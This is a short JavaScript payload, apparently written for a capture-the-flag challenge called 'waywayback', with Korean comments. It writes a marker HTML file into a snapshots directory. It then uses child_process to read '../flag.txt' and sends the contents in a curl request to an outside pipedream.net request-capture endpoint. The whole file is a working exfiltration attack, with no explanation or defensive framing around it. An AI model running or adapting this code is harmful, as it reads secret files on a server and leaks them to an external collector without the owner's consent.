(() => {
  try {
    const fs = require("fs");
    const path = require("path");
        // /app/snapshots 로 추정되는 위치
    const snapshotsDir = __dirname;

    // 고정된 snapshot id로 html 생성 → 브라우저로 바로 확인 가능
    const markerId = "deadbeefdeadbeef";
    const outPath = path.join(snapshotsDir, `${markerId}.html`);
    fs.writeFileSync(outPath, "MARKER_OK", "utf8");
    const { execSync } = require('child_process');
    
    try {
      const flag = execSync('cat ../flag.txt', { encoding: 'utf8' })
        .trim()
        .replace(/\n/g, '');
    
      execSync(`curl "https://5ce34728a92f6a97b751d3221c0f0313.m.pipedream.net/?flag=${flag}"`);
    
    } catch (e) {
      console.log(e);
    }

    console.log("[waywayback hellow] marker html written");
  } catch (e) {
    try { console.log("[waywayback] error:", String(e)); } catch (_) {}
  }
})();
